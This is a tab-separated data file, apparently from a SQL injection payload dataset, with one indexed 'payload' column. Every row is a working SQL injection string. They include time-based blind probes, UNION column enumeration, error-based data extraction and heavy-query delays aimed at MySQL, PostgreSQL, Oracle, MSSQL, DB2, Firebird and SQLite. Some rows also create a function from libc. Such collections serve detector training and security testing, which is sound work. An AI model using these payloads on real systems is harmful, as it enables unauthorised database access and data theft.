Unnamed: 0	payload
26486	"1"") as jidc where 6093=6093 and 9198=9198--"
26487	1')) as tlsl where 8467=8467;begin user_lock.sleep(5); end--
26488	"1"") as ivkw where 4218=4218 union all select null--"
26489	1%'))) and elt(3114=3114,sleep(5))#
26490	-7843' where 5986=5986 or make_set(9354=9354,7185)--
26491	1%'));begin user_lock.sleep(5); end--
26492	1 and make_set(6911=1867,1867)
26493	1) as ktfu where 2637=2637;call regexp_substring(repeat(right(char(2385),0),500000000),null)--
26494	"1"") and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""pqsp""=""pqsp"
26495	"1"" and 6969=(select 6969 from pg_sleep(5))"
26496	1%'))) or (select * from (select(sleep(5)))sddo)#
26497	"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""jbty"" like ""jbty"
26498	1)) as qlkf where 6635=6635;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
26499	"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#"
26500	1')) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
26501	"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""zcfa""=""zcfa"
26502	-6096') where 1316=1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#
26503	1' waitfor delay '0:0:5'
26504	1' where 6135=6135;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
26505	"1"") as drrx where 8633=8633 union all select null,null,null--"
26506	1'||(select 'lstx' from dual where 2972=2972 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'
26507	"1%""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""%""="""
26508	"1""))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--"
26509	1));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((4142=4142
26510	"1"")) as szxa where 1501=1501 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--"
26511	"1%"")) or sleep(5)#"
26512	1') where 6081=6081 union all select null,null,null,null,null,null,null,null,null--
26513	-9840')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('dzlp'='dzlp
26514	-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#
26515	1')) union all select null,null,null,null,null,null,null--
26516	-9821) as qqrm where 7152=7152 union all select 7152,7152,7152,7152--
26517	1'+(select vvet where 5221=5221 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'
26518	-9281) where 8363=8363 or make_set(8220=5127,5127)--
26519	1');(select * from (select(sleep(5)))srmq)
26520	1)) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((6659=6659
26521	1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('teng' like 'teng
26522	"-5190%"" or 8298=9306 and ""%""="""
26523	1 and (5369=8325)*8325# psze
26524	1 where 2146=2146 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--
26525	1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'cxor'='cxor
26526	-4222') union all select 9267,9267,9267,9267,9267,9267--
26527	1'))) or 6793=(select 6793 from pg_sleep(5)) and ((('mzqi'='mzqi
26528	1) and (7557=1711)*1711 and (5157=5157
26529	1))) union all select null,null,null,null,null#
26530	"-4513""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""gytb""=""gytb"
26531	-2766%')) union all select 4458,4458,4458,4458,4458--
26532	1' in boolean mode) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))#
26533	1%')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('%'='
26534	-4952'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('abso'='abso
26535	"-7272"") union all select 9163,9163,9163,9163,9163,9163,9163--"
26536	1' in boolean mode) rlike (select * from (select(sleep(5)))sgvo)#
26537	"1"" union all select null,null,null,null--"
26538	1') union all select null,null,null,null,null--
26539	1') where 2511=2511 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--
26540	1' union all select null,null,null,null,null,null,null,null,null--
26541	1') where 2090=2090;select count(*) from generate_series(1,5000000)--
26542	1%'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'='
26543	1'+(select 'zirh' where 9054=9054 and 3824=benchmark(5000000,md5(0x76555642)))+'
26544	1') and (3020=3020)*6703
26545	1 or 6793=(select 6793 from pg_sleep(5))-- fyaq
26546	1'||(select 'osty' from dual where 6433=6433 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'
26547	-8357')) as henk where 8198=8198 or 2558=9103#
26548	1')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('vcvj'='vcvj
26549	1'||(select 'wcad' from dual where 4262=4262 and elt(3114=3114,sleep(5))#
26550	"1"") where 5698=5698 and 8635=(select count(*) from generate_series(1,5000000))--"
26551	1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'tuzl'='tuzl
26552	1') where 9817=9817;begin user_lock.sleep(5); end--
26553	"1""));select * from generate_series(6200,6200,case when (6200=5449) then 1 else 0 end) limit 1--"
26554	"1"") as xsgx where 5239=5239 union all select null,null--"
26555	1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'dphz'='dphz
26556	1 and 7533=7533-- spzi
26557	1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)
26558	"1%"" or 6793=(select 6793 from pg_sleep(5)) and ""%""="""
26559	-9657') as ziiq where 7725=7725 or 3038=3038
26560	1'+(select pepf where 5071=5071 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
26561	1')) order by 1#
26562	1)) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((5139=5139
26563	-9522) as lraw where 9472=9472 or (4087=8213)*8213--
26564	1%');begin dbms_lock.sleep(5); end--
26565	-7659') as bowy where 4835=4835 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
26566	"-8940"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""vnuo"" like ""vnuo"
26567	1;waitfor delay '0:0:5'--
26568	"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)"
26569	1' where 3701=3701 and 2006=2006
26570	1') union all select null#
26571	1)) as vycb where 3524=3524 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
26572	1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('ykxz'='ykxz
26573	"1%"")) union all select null,null,null,null,null,null,null,null,null,null--"
26574	1'||(select 'jscc' from dual where 3266=3266 and elt(4249=4249,7259))||'
26575	"1""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""lmjg"" like ""lmjg"
26576	"1""))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--"
26577	1' or elt(6272=6272,sleep(5)) and 'wdoi'='wdoi
26578	"1"")) as qgwq where 6122=6122;call regexp_substring(repeat(right(char(2385),0),500000000),null)--"
26579	1);begin dbms_lock.sleep(5); end--
26580	1%'))) and 9198=9198--
26581	-2247') union all select 1202,1202,1202,1202,1202#
26582	"1""))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""wvlb"" like ""wvlb"
26583	"1%"" waitfor delay '0:0:5'--"
26584	1%');select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
26585	1%') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('%'='
26586	"1""))) and (3020=3020)*6703 and (((""krxy""=""krxy"
26587	1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
26588	1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw
26589	"1%""));select case when 7717=7717 then 1 else null end--"
26590	1) as oknr where 3228=3228;(select * from (select(sleep(5)))srmq)--
26591	"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)"
26592	"1""))) union all select null,null,null,null,null,null--"
26593	"1"" where 9792=9792 rlike (select * from (select(sleep(5)))vwyq)#"
26594	1') as twny where 9580=9580;begin dbms_lock.sleep(5); end--
26595	-7720)) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((8254=8254
26596	"1%"")) waitfor delay '0:0:5'--"
26597	"1"" where 1140=1140 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--"
26598	1' in boolean mode) union all select null,null,null,null,null,null,null,null#
26599	1'+(select biqo where 6046=6046;select like('abcdefg',upper(hex(randomblob(500000000/2))))--
26600	1%')) and make_set(8403=8403,8899) and (('%'='
26601	-3632' or make_set(9354=9354,7185) and 'lgpy' like 'lgpy
26602	1)) as hgtl where 3864=3864 and elt(3114=3114,sleep(5))#
26603	"1"") as pkkx where 6716=6716 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--"
26604	-7435') where 6242=6242 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--
26605	"1%"") union all select null,null,null--"
26606	"1"")) as tngu where 3644=3644 union all select null--"
26607	"1%"") and 7533=7533 and (""%""="""
26608	"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""pmpk"" like ""pmpk"
26609	1' in boolean mode) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#
26610	"1"") or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--"
26611	-1303' union all select 4840,4840#
26612	-9644)) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((5616=5616
26613	1' where 8950=8950 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
26614	"1"" union all select null,null,null,null,null--"
26615	1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ican' like 'ican
26616	1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('bacm'='bacm
26617	1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('adjc'='adjc
26618	1 where 4985=4985 order by 1#
26619	-8790') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('nsze' like 'nsze
26620	"1"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""mmgx"" like ""mmgx"
26621	1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('nlky' like 'nlky
26622	"-7107""))) order by 1#"
26623	"1"") as ktnq where 9005=9005;select benchmark(5000000,md5(0x714e4153))#"
26624	1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('jueq'='jueq
26625	1'))) union all select null,null,null,null--
26626	1'+(select 'sppw' where 1677=1677 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'
26627	-8652') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))
26628	1;select pg_sleep(5)-- ojzt
26629	"1"" where 4633=4633 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--"
26630	"1%"" union all select null,null,null,null,null,null#"
26631	1))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((1748=1748
26632	"-2027%"") union all select 2048,2048,2048,2048,2048,2048,2048,2048#"
26633	"1"")) or 4240=(select 4240 from pg_sleep(5))--"
26634	1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ozef'='ozef
26635	"1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""rrbl""=""rrbl"
26636	-6014')) or (9860=4848)*4848 and (('qtge'='qtge
26637	(select like('abcdefg',upper(hex(randomblob(500000000/2)))))
26638	-3633') where 3513=3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#
26639	1;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
26640	1') as xqbq where 1619=1619 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--
26641	1' where 8635=8635 order by 1--
26642	-6036))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((6723=6723
26643	1 union all select null,null,null,null,null,null,null,null,null,null#
26644	1);select sleep(5) and (4863=4863
26645	-8860) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)
26646	"1"" and (select * from (select(sleep(5)))gcrr)#"
26647	"-1048%"" or 3038=3038"
26648	-2359' union all select 2687,2687,2687#
26649	1) as wshv where 5684=5684;(select * from (select(sleep(5)))acdk)#
26650	-4289' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'agnc' like 'agnc
26651	1') as mqxb where 6496=6496 and 7533=7533--
26652	"-3219"") order by 1--"
26653	1%');call regexp_substring(repeat(right(char(2385),0),500000000),null)--
26654	-6039%')) or 6872=6872 and (('%'='
26655	1') where 4092=4092 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
26656	"1"")) as riui where 2605=2605;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--"
26657	1'+(select eluw where 6210=6210;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#
26658	1%' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and '%'='
26659	"1"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""kzcd""=""kzcd"
26660	1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
26661	-9774'))) union all select 6954,6954,6954#
26662	1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'tfso'='tfso
